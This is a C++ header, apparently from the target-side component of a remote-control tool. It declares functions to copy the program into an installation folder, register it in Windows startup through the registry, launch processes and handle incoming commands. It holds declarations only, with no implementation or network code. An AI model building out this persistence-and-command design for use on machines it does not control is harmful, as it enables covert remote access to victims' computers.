//
// Created by Berlingot on 2023-04-20.
//

#ifndef SERVEUR___CIBLE_INSTALLATIONANDSTART_H
#define SERVEUR___CIBLE_INSTALLATIONANDSTART_H


#include <Windows.h>
#include <string>
#include <tchar.h>
#include <cstdio>
#include <time.h>
#include <fstream>
#include <thread>


#include "string"
//Mes fichiers
#include "Conversion.h"
#include "Settings.h"
#include "OperationState.h"
#include "CMD.h"
#include "Utility.h"
class installationAndStart {
public:
    //variables
    static std::string CurrentPath;			//current path of executable
    static std::string installationFolder;		//path of folder it should be installed to
    static std::string installationPath;			//full path where executable should be installed to
    static bool installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,

    static bool locationSet();	//installation path
    static bool startupSet();	//demarrage path
    static bool installed();	//installation dans le path
    static bool directoryExists(const char* dirName);

    static bool processParameter(std::string &command, std::string compCommand);

    static std::string getInstallFolder();
    static std::string getCurrentPath();
    static std::string getInstallationPath(std::string instFolder);

    static void setLocation();		//

    static void runInstalled();

    static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process

    static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);	//registers a program in startup with supplied name, path to exe and startup arguments

    static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);	//checks if a certain value exists in the registry

    static std::string processCommand(std::string command);		//processes command

    static void handleError(int errType, bool errSevere);							//handles errors

    //instead of proceeding to the main loop)
    //static LPTSTR lpArguments;

    //Fonctions
    static OperationState init();

};

#endif //SERVEUR___CIBLE_INSTALLATIONANDSTART_H
